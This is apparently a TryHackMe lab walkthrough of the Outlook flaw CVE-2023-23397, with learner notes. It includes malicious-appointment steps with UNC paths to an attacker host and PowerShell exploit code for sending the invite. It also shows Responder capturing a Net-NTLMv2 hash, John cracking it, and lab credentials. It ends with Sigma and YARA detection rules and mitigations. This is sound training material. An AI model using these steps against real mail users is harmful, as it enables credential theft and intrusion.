----
Leak password hashes from a user by sending them an email by abusing CVE-2023-23397.
---

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/86ec79178d0c8f02cdfbf389578a299a.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/0dcd723bba8ef9a1d0ec3a41c92a490a.png)
### Introduction

 Start Machine

On Tuesday, March 14th, Microsoft released 83 security fixes on Patch Tuesday, including CVE-2023-23397. This critical vulnerability impacts all versions of the Outlook desktop app on any Windows system. Outlook web app (OWA) and Microsoft 365 aren't vulnerable since they do not support NTLM authentication.

Unlike most exploits, this one is particularly dangerous because it is a zero-click exploit, meaning no user interaction is required to trigger it. Once an infected email arrives in the user's inbox, the attacker can obtain sensitive Net-NTLMv2 credential hashes. Once malicious actors have those hashes, they can get a user's credentials, authenticate to their system and escalate privileges.

Starting the VM

To deploy the attached VM, press the green `Start Machine` button at the top of the task. The machine should launch in a split-screen view. If it doesn't, you can press the blue `Show Split View` button near the top-right of this page. All of the room can be done in split view, but if you prefer connecting to the machine via RDP, you can use the following credentials:

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d471dd234b7fc4eb4edea3c934663c1.png)

**Username**

Administrator

**Password**

Password321

Your VM has a trial version of Outlook installed, so feel free to ignore any activation messages. When opening Outlook, you can also close the "Sign in to set up Office" screen without a problem to continue:

![Sign in to Office](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fc8922223ac0a45d38a8673ee559d34e.png)  

You will also need to use the AttackBox, so this is a good moment to hit the `Start AttackBox` button at the top of the room.  

Answer the questions below

Start the VM and continue learning!

Question Done

```
┌──(witty㉿kali)-[~/Downloads]
└─$ xfreerdp /v:10.10.247.166 /u:Administrator /p:Password321 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%

```

### Abusing Appointment Alerts

Outlook Appointment Alerts

On Outlook, it's possible to add reminder notifications when sending calendar invitations:  

![Outlook Appointments](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a62596e7262ef8119a558ee9598ec2ef.png)

You can specify the audio file played when a user gets a notification reminder for a calendar meeting or event. Typically, this would be used for a user to set up their own notifications by pointing to an audio file:

![Reminder Sound Configuration](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/471b82a81e0a4b210191dafe1a0a55e1.png)

Manipulating this parameter can enable a threat actor to force Outlook to leak the current password hashes to an attacker with zero interaction required.

Abusing Reminder Sounds via UNC Paths  

To exploit this vulnerability, an attacker must create a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attacker's machine. At a low level, an Outlook email stores the reference to the sound file in an internal parameter called **PidLidReminderFileParameter**. To ensure that the audio we embed in our malicious email will take precedence over the victim's default reminder configurations, we will also need to set another parameter called **PidLidReminderOverride** to `true`.

To set up the **PidLidReminderFileParameter** property to point to a network share, the attacker can specify a **Universal Naming Convention (UNC)** path instead of a local file. UNC is used in Windows operating systems to find network resources (files, printers, shared documents). These paths consist of a double backslash, the IP address or name of the computer hosting the resource, the share name and the file name. For example:

`\\ATTACKER_IP\foo\bar.wav`

When the victim receives the malicious email, the UNC path directs them to that SMB share, triggering the vulnerability. This causes the system to start an NTLM authentication process against the attacker's machine, leaking a Net-NTLMv2 hash that the attacker can later try to crack.

![Exploiting the Vulnerability](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c841bc06b6cfd44c8453d21204a9927b.png)

If for some reason the SMB protocol isn't a viable alternative to use, non-server versions of Windows will accept using UNC paths pointing to ports 80 or 443, and use HTTP to retrieve the file from a WebDAV-enabled web server. The syntax of such UNC path is as follows:

`\\ATTACKER_IP@80\foo\bar.wav`

`\\ATTACKER_IP@443\foo\bar.wav`

This may be useful to bypass firewall restrictions preventing outgoing connections to port 445 (SMB).

Answer the questions below

Click and continue learning!

Question Done

### Crafting a Malicious Appointment

Now that we understand how the vulnerability works let's craft a malicious email containing an appointment with the required parameters to trigger it.

Setting up Responder

Since we expect the victim to trigger an authentication attempt against the attacker on port 445, we will set up Responder to handle the authentication process and capture the NetNTLM hash for us. If you are unfamiliar with Responder, it will simply emulate an SMB server and capture any authentication attempt against it.

To launch Responder to listen for authentication attempts in your `ens5` interface, you can simply run the following command in your AttackBox:

AttackBox

```shell-session
root@attackbox$ responder -I ens5
```

We are now ready to trigger an authentication attempt via the Outlook vulnerability.

Attempting to Handcraft a Malicious Appointment

As a first attempt, we could manually create an appointment and edit the path to the reminder's sound file to point to a shared folder. To create an appointment, you will first need to click on the calendar and then on the New Appointment button on the taskbar, as shown in the image below:

![Creating Appointments](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/856ee9002399b21c3614d03e42d36d76.png)  

We will create an appointment that includes a reminder set in 0 minutes so that it triggers right after the victim receives it. We will also click on the Sound option to configure the reminder's sound file:  

![Setting up Reminders](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c8d3358b21a94b6e77e62cac19e5d428.png)  

We can try setting the sound file path to a UNC path that points to our AttackBox and click the OK button like this:

![Attempting to Set UNC Path](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c58df06376a0bb64fd81ca4bfef030f9.png)

However, Outlook will silently ignore the UNC path and revert to using the default WAV file, which can be confirmed by going back to the Sound dialogue:  

![Reverting to the Default Sound](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/db44d3912977c59120c5bf0fef2dcf96.png)  

Since Outlook isn't expecting users to input a UNC path here, it probably discards our attempt as invalid output. But not all hope is lost!

OutlookSpy to the Rescue

Even if Outlook cannot set the reminder's sound file to a UNC path, we can use the OutlookSpy plugin to achieve this. This plugin will allow you to access all of Outlook's internal parameters directly, including the reminder's sound file.

You can find OutlookSpy's installer in your machine's desktop. You will need to install it manually before proceeding. Be sure to close Outlook before running the installer.

To view our current appointment from OutlookSpy, click the `OutlookSpy` tab and then the `CurrentItem` button in the taskbar:

Note: Be sure to click the CurrentItem button from within the appointment, or you might modify different Outlook components.

![OutlookSpy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/60dfeace2365e8ef434a2161783313f0.png)  

From this window, you can see the parameters associated with the appointment's reminder. We want to set the **ReminderSoundFile** parameter to the UNC path that points to our AttackBox and set both the **ReminderOverrideDefault** and **ReminderPlaySound** to `true`. Just for reference, here's what each parameter does:

-   **ReminderPlaySound:** boolean value that indicates if a sound will be played with the reminder.
-   **ReminderOverrideDefault**: boolean value that indicates the receiving Outlook client to play the sound pointed by **ReminderSoundFile**, instead of the default one.
-   **ReminderSoundFile**: string with the path to the sound file to be used. For our exploit, this will point to a bogus shared folder in our AttackBox.

We can use the script tab and the following script to change the parameters to the required values:  

![Modifying Email Parameters](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d234c96f9fb857da332b0d058b703081.png)  

Be sure to click the `Run` button for the changes to be applied. You can go back to the `Properties` tab to check that the values were correctly changed. Finally, save your appointment to add it to your calendar, making sure the reminder is set to 0 minutes and that the appointment matches the current time and date, as we want it to trigger immediately:

![Saving the Appointment](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/859e6a2f69ac2726bf6b400dd4f2bad2.png)  

If all went as expected, you should immediately see a reminder popping up:

![Appointment Pop-Up](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d6dbc3af8bd70b13013c63d3d4bb6f10.png)

And you should receive the authentication attempt in your Responder console on your AttackBox:

![Responder Captured Hash](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e71d49e828ca32843cf96b66c32b190.png)  

Answer the questions below

```
OutlookSpy is a software tool used for debugging and troubleshooting Microsoft Outlook applications. It allows developers and advanced users to explore the internal structure and properties of Outlook objects, such as messages, appointments, contacts, and folders.

With OutlookSpy, users can view and modify various properties of Outlook objects, including hidden or non-editable properties. The tool also provides access to Outlook APIs, allowing users to perform advanced operations and customize the behavior of Outlook applications.

OutlookSpy can be particularly useful for developers who are creating add-ins or custom solutions for Outlook, as it provides a way to test and debug their code in real-time. It can also be helpful for advanced users who need to diagnose and fix issues with their Outlook profiles or data.

OutlookSpy is not an official Microsoft product, but it is widely used and respected in the developer community. It is available for purchase from the creator's website, Add-in Express.

AppointmentItem.ReminderOverrideDefault = true
AppointmentItem.ReminderPlaySound = true
AppointmentItem.ReminderSoundFile = "\\10.8.19.103\nonexistent\sound.wav"

save it

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.19.103]
    Responder IPv6             [fe80::9f93:f9df:666d:2625]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-P9DI1JN38PD]
    Responder Domain Name      [VH4K.LOCAL]
    Responder DCE-RPC Port     [46547]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.247.166
[SMB] NTLMv2-SSP Username : THM-LAB\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::THM-LAB:e5322b5f9ec191ab:9412C0688974921F09FC134A8296BED0:01010000000000000026BAEAFC66D90198BF7474479741DA00000000020008005600480034004B0001001E00570049004E002D00500039004400490031004A004E00330038005000440004003400570049004E002D00500039004400490031004A004E0033003800500044002E005600480034004B002E004C004F00430041004C00030014005600480034004B002E004C004F00430041004C00050014005600480034004B002E004C004F00430041004C00070008000026BAEAFC66D9010600040002000000080030003000000000000000000000000030000037B3D92C9073F2C7F11D05A5D22A1FAC31384D16126E07B05E870F49F45697350A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00310039002E003100300033000000000000000000

┌──(witty㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password321      (Administrator)     
1g 0:00:00:03 DONE (2023-04-04 14:09) 0.2985g/s 627849p/s 627849c/s 627849C/s R55555..Passion7
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                                                                                   
┌──(witty㉿kali)-[/tmp]
└─$ john --show hash                                     
Administrator:Password321:THM-LAB:e5322b5f9ec191ab:9412C0688974921F09FC134A8296BED0:01010000000000000026BAEAFC66D90198BF7474479741DA00000000020008005600480034004B0001001E00570049004E002D00500039004400490031004A004E00330038005000440004003400570049004E002D00500039004400490031004A004E0033003800500044002E005600480034004B002E004C004F00430041004C00030014005600480034004B002E004C004F00430041004C00050014005600480034004B002E004C004F00430041004C00070008000026BAEAFC66D9010600040002000000080030003000000000000000000000000030000037B3D92C9073F2C7F11D05A5D22A1FAC31384D16126E07B05E870F49F45697350A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00310039002E003100300033000000000000000000

1 password hash cracked, 0 left


```

Click and continue learning!

Question Done

### Weaponizing the Vulnerability

Summarising the steps required to exploit the vulnerability, an attacker would need to:  

1.  Create a malicious meeting/appointment with a custom reminder sound pointing to a UNC path on the attacker's machine.
2.  Send the invite to the victim via email.
3.  Wait for the reminder to trigger a connection against the attacker's machine.
4.  Capture the Net-NTLMv2 hash, use authentication relaying, or profit in any other way.

Steps 3 and 4 are already covered for us by `Responder`, but handcrafting the malicious appointment by hand is a bit tedious. Luckily, a couple of exploits are readily available for us to create and send a malicious appointment. 

In this task, we will look at the exploit published by [Oddvar Moe](https://github.com/api0cradle), which is probably the easiest to understand and use. This Powershell exploit leverages Outlook's COM objects to build emails and appointments easily. It contains a couple of functions that we can use:

-   **Save-CalendarNTLMLeak:** This function creates a malicious appointment and saves it to your own calendar. Useful for testing purposes.
-   **Send-CalendarNTLMLeak:** This function creates a malicious appointment and sends it via email to a victim. The email invitation will be sent from your Outlook's current default account.

Dissecting the Exploit's Code

Both will create an appointment similarly, so we'll explain the **Save-CalendarNTLMLeak** only. 

First, we will instantiate an "Outlook.Application" object and create an appointment.

```powershell
$Outlook = New-Object -comObject Outlook.Application
$newcal = $outlook.CreateItem('olAppointmentItem')
```

The usual parameters of an appointment will be set. These include the recipients, meeting subject, location, body and start and end dates. The exploit sets the start day to the current time so that the reminder is triggered immediately:

```powershell
$newcal.Recipients.add($recipient)
$newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
$newcal.Subject = $meetingsubject
$newcal.Location = "Virtual"
$newcal.Body = $meetingbody
$newcal.Start = get-date
$newcal.End = (get-date).AddHours(2)
```

The following additional parameters will be configured to point the reminder's sound file to the attacker's server, as previously explained:

```powershell
$newcal.ReminderSoundFile = $remotefilepath
$newcal.ReminderOverrideDefault = 1
$newcal.ReminderSet = 1
$newcal.ReminderPlaysound = 1
```

Finally, the appointment will be sent to the recipient via email:

```powershell
$newcal.send()
```

Using the Exploit

You can import the exploit's functions with the Import-Module cmdlet. After that, both functions will be available in your current Powershell. To send an email with a malicious appointment, you can just run the following command:

Powershell

```shell-session
PS C:\> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop\> Import-Module .\CVE-2023-23397.ps1
PS C:\Users\Administrator\Desktop\> Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"
```

Be sure to replace ATTACKER_IP with the IP address of your AttackBox in the `-remotefilepath` parameter. Notice that you are using the exploit to send yourself an email in this case, as we have a single account in the machine, but normally you would target other email addresses.

Since the exploit makes use of the current Outlook instance to send the email, you will likely get a couple of alerts asking you to grant permission to the script to send emails on your behalf. Make sure to press Allow as many times as needed. Marking the "Allow access for 10 minutes" checkbox should also help speed this process up:

![Outlook Warning](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a3a747638a701510141be9803cd28c9.png)  

Answer the questions below

```
PS C:\Users\Administrator> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop> Import-Module .\CVE-2023-23397.ps1
PS C:\Users\Administrator\Desktop> Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\10.8.19.103\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"


Application           : Microsoft.Office.Interop.Outlook.ApplicationClass
Class                 : 4
Session               : System.__ComObject
Parent                : System.__ComObject
Address               :
AddressEntry          : System.__ComObject
AutoResponse          :
DisplayType           : 0
EntryID               : 00000000812B1FA4BEA310199D6E00DD010F54020000018074006500730074004000740068006D002E006C006F00630
                        0000053004D0054005000000074006500730074004000740068006D002E006C006F0063000000
Index                 : 1
MeetingResponseStatus : 0
Name                  : test@thm.loc
Resolved              : True
TrackingStatus        : 0
TrackingStatusTime    : 1/1/4501 12:00:00 AM
Type                  : 1
PropertyAccessor      : System.__ComObject
Sendable              : True

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo responder -I tun0
[sudo] password for witty: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.19.103]
    Responder IPv6             [fe80::9f93:f9df:666d:2625]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-JV9OA8O6PD5]
    Responder Domain Name      [B3BJ.LOCAL]
    Responder DCE-RPC Port     [46438]

[+] Listening for events...

[*] Skipping previously captured hash for THM-LAB\Administrator

```

Click and continue learning!

Question Done


### Detection/Mitigation

Now that we have gone through the steps to weaponize the `CVE-2023-23397` attack on Outlook, let's talk about a few ways to detect this attack within the network. Each attack leaves patterns or artifacts that could help the detection team identify the threats. It all depends on the network visibility and the log sources that are being collected and providing the much important visibility.  

Here, we will discuss a few ways to detect this attack on the host.

Sigma Rules  

The following Sigma rule detects Outlook initiating a connection to a WebDav or SMB share, indicating a post-exploitation phase.  

```c
title: CVE-2023-23397 Exploitation Attempt
id: 73c59189-6a6d-4b9f-a748-8f6f9bbed75c
status: experimental
description: Detects outlook initiating connection to a WebDAV or SMB share, which
  could be a sign of CVE-2023-23397 exploitation.
author: Robert Lee @quantum_cookie
date: 2023/03/16
references:
- https://www.trustedsec.com/blog/critical-outlook-vulnerability-in-depth-technical-analysis-and-recommendations-cve-2023-23397/
tags:
- attack.credential_access
- attack.initial_access
- cve.2023.23397
logsource:
  service: security
  product: windows
  definition: 'Requirements: SACLs must be enabled for "Query Value" on the registry
    keys used in this rule'
detection:
  selection:
    EventID:
    - 4656
    - 4663
    ProcessName|endswith: \OUTLOOK.EXE
    Accesses|contains: Query key value
    ObjectName|contains|all:
    - \REGISTRY\MACHINE\SYSTEM
    - Services\
    ObjectName|endswith:
    - WebClient\NetworkProvider
    - LanmanWorkstation\NetworkProvider
  condition: selection
falsepositives:
- Searchprotocolhost.exe likes to query these registry keys. To avoid false postives,
  it's better to filter out those events before they reach the SIEM
level: critical
```

This [Sigma Rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml) looks to detect svchost.exe spawning rundll32.exe with command arguments like `C:\windows\system32\davclnt.dll,DavSetCookie`, which indicates a post-exploitation/exfiltration phase.  

```c
title: Suspicious WebDav Client Execution
id: 982e9f2d-1a85-4d5b-aea4-31f5e97c6555
status: experimental
description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
  like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of
  exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially
  a sign of exploitation of CVE-2023-23397

  '
references:
- https://twitter.com/aceresponder/status/1636116096506818562
- https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/
- https://www.pwndefend.com/2023/03/15/the-long-game-persistent-hash-theft/
author: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)
date: 2023/03/16
tags:
- attack.exfiltration
- attack.t1048.003
- cve.2023.23397
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: \svchost.exe
    Image|endswith: \rundll32.exe
    CommandLine|contains: C:\windows\system32\davclnt.dll,DavSetCookie
    CommandLine|re: ://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
  filter_local_ips:
    CommandLine|contains:
    - ://10.
    - ://192.168.
    - ://172.16.
    - ://172.17.
    - ://172.18.
    - ://172.19.
    - ://172.20.
    - ://172.21.
    - ://172.22.
    - ://172.23.
    - ://172.24.
    - ://172.25.
    - ://172.26.
    - ://172.27.
    - ://172.28.
    - ://172.29.
    - ://172.30.
    - ://172.31.
    - ://127.
    - ://169.254.
  condition: selection and not 1 of filter_*
falsepositives:
- Unknown
level: high
```

These SIGMA rules can be converted into the detection and monitoring tool to hunt for suspicious log activity within the network. To learn more about SIGMA rules, check this introductory room on [Sigma](https://tryhackme.com/room/sigma).

Yara Rule  

YARA rule looks for the pattern within the files on disk. The following three community YARA rules can be used to detect the suspicious MSG file on the disk with two properties discussed in the above tasks.

```c
rule SUSP_EXPL_Msg_CVE_2023_23397_Mar23 {
   meta:
      description = "MSG file with a PidLidReminderFileParameter property, potentially exploiting CVE-2023-23397"
      author = "delivr.to, modified by Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
      date = "2023-03-15"
      modified = "2023-03-17"
      score = 60
      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
   strings:
      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
      /* PSETID_Appointment */
      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
      /* PSETID_Meeting */
      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
      /* PSETID Task */
      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
      /* PidLidReminderFileParameter */
      $rfp = { 1F 85 00 00 }
      /* \\ UNC path prefix - wide formatted */
      $u1 = { 00 00 5C 00 5C 00 }
      /* not MSI */
      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
   condition:
      uint32be(0) == 0xD0CF11E0
      and uint32be(4) == 0xA1B11AE1
      and 1 of ($psetid*)
      and $rfp
      and $u1
      and not 1 of ($fp*)
}
```

  

```c
rule EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 {
   meta:
      description = "Detects suspicious .msg file with a PidLidReminderFileParameter property exploiting CVE-2023-23397 (modified delivr.to rule - more specific = less FPs but limited to exfil using IP addresses, not FQDNs)"
      author = "delivr.to, Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
      date = "2023-03-15"
      modified = "2023-03-18"
      score = 75
      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
      hash = "e7a1391dd53f349094c1235760ed0642519fd87baf740839817d47488b9aef02"
   strings:
      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
      /* PSETID_Appointment */
      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
      /* PSETID_Meeting */
      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
      /* PSETID Task */
      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
      /* PidLidReminderFileParameter */
      $rfp = { 1F 85 00 00 }
      /* \\ + IP UNC path prefix - wide formatted */
      $u1 = { 5C 00 5C 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 3? 00 3? 00|3? 00 3? 00|3? 00) }
      /* \\ + IP UNC path prefix - regular/ascii formatted for Transport Neutral Encapsulation Format */
      $u2 = { 00 5C 5C (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 3? 3?|3? 3?|3?) }
      /* not MSI */
      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
   condition:
      (
         uint16(0) == 0xCFD0 and 1 of ($psetid*)
         or
         uint32be(0) == 0x789F3E22
      )
      and any of ( $u* )
      and $rfp
      and not 1 of ($fp*)
}
```

  

```c
rule EXPL_SUSP_Outlook_CVE_2023_23397_SMTP_Mail_Mar23 {
   meta:
      author = "Nils Kuhnert"
      date = "2023-03-17"
      description = "Detects suspicious *.eml files that include TNEF content that possibly exploits CVE-2023-23397. Lower score than EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 as we're only looking for UNC prefix."
      score = 60
      reference = "https://twitter.com/wdormann/status/1636491612686622723"
   strings:
      // From:
      $mail1 = { 0A 46 72 6F 6D 3A 20 }
      // To: 
      $mail2 = { 0A 54 6F 3A }
      // Received:
      $mail3 = { 0A 52 65 63 65 69 76 65 64 3A }
      // Indicates that attachment is TNEF
      $tnef1 = "Content-Type: application/ms-tnef" ascii
      $tnef2 = "\x78\x9f\x3e\x22" base64
      // Check if it's an IPM.Task
      $ipm = "IPM.Task" base64
      // UNC prefix in TNEF
      $unc = "\x00\x00\x00\x5c\x5c" base64
   condition:
      all of them
}
```

YARA is already installed on the machine. The YARA rule file `cve-2023-23397.yar` and the malicious MSG file `appointment.msg` can be found on the Desktop. Open the terminal and run the following command to run the rule against the MSG file.  

Powershell

```shell-session
PS C:\USers\Administrator\Desktop> yara64 .\cve-2023-23397.yar.txt .\appointment.msg
SUSP_EXPL_Msg_CVE_2023_23397_Mar23 .\appointment.msg
EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 .\appointment.msg
```

To learn more about YARA and its pattern-matching use, check this introductory room on [YARA](https://tryhackme.com/room/yara).

Powershell script  

Microsoft has released a PowerShell script [CVE-2023-23397.ps1](https://microsoft.github.io/CSS-Exchange/Security/CVE-2023-23397/)  that will check the Exchange messaging items like Mail, calendar,  and tasks to see if the IOCs related to the CVE-2023-23397 attack are found.  The script can be used to audit and clean the detected items.

**Note:** This script is not usable in this lab.  

Mitigation

This vulnerability is being exploited extensively in the wild. Some of the recommended steps as recommended by [Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397) in order to mitigate and avoid this attack are:

-   Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism.
-   Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.
-   Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.
-   Disable WebClient service to avoid webdav connection.  
    

Answer the questions below

```
WebDAV stands for "Web Distributed Authoring and Versioning." It is an extension of the HTTP protocol that allows users to remotely manage files and folders on a web server.

WebDAV is commonly used for collaborative document editing and management, as it allows multiple users to access and edit the same files from different locations. It also supports file versioning, which means that previous versions of a file can be accessed and restored if needed.

WebDAV is supported by many web servers, including Apache, Microsoft IIS, and nginx, as well as many operating systems, including Windows, macOS, and Linux. It can be accessed using various client applications, such as Microsoft Office, macOS Finder, and various third-party file managers.

Some common use cases for WebDAV include:

-   Collaborative document editing: WebDAV can be used to allow multiple users to access and edit the same documents stored on a web server.
-   Remote file management: WebDAV can be used to manage files and folders on a web server without the need for direct server access.
-   Content management: WebDAV can be used to manage the content of a website, including creating, modifying, and deleting files and folders.

